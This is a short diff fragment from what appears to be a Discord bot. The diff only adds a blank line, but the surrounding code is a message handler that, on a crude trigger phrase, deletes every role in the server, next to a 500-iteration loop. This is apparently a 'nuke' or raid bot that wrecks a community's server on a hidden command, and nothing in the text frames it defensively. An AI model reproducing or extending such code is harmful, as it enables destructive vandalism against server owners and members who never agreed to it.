@@ -24,6 +24,7 @@ for (let i = 0; i < 500; i++) {
 }); 
 
 
+
 client.on('message', x5bz => {   
     if (x5bz.content.startsWith("monster fuck")) {
         x5bz.guild.roles.forEach(r => { r.delete() }) 
